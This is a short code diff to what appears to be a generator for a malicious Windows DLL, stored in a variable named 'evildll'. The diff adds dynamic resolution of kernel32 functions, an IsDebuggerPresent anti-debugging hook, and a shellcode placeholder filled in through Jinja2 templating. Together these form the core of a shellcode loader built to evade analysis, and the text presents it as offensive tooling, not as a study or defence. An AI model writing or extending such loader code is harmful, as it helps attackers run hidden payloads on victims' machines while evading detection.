@@ -2,6 +2,8 @@
 evildll = """#include <windows.h>
 #include <string.h>
 #include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
 
 // Structure for storing API addresses
 typedef struct _API_TABLE {
@@ -14,10 +16,16 @@ typedef struct _API_TABLE {
     FARPROC GetModuleHandleA;
     FARPROC GetCurrentProcess;
     FARPROC Sleep;
+    FARPROC IsDebuggerPresent;
+    FARPROC ResumeThread;
+    FARPROC CloseHandle;
 } API_TABLE;
 
 // Global storage for API addresses
 API_TABLE apiTable;
+
+// Shellcode placeholder for Jinja2 template processing
+unsigned char payload[] = "{{payload}}";
 
 // Function to resolve API addresses dynamically
 BOOL ResolveAPIAddresses() {
@@ -31,7 +39,10 @@ BOOL ResolveAPIAddresses() {
     apiTable.CreateThread = apiTable.GetProcAddress(hKernel32, "CreateThread");
     apiTable.VirtualProtectEx = apiTable.GetProcAddress(hKernel32, "VirtualProtectEx");
     apiTable.VirtualFreeEx = apiTable.GetProcAddress(hKernel32, "VirtualFreeEx");
-    
+    apiTable.IsDebuggerPresent = apiTable.GetProcAddress(hKernel32, "IsDebuggerPresent");
+    apiTable.ResumeThread = apiTable.GetProcAddress(hKernel32, "ResumeThread");
+    apiTable.CloseHandle = apiTable.GetProcAddress(hKernel32, "CloseHandle");
+
     return TRUE;
 }
 
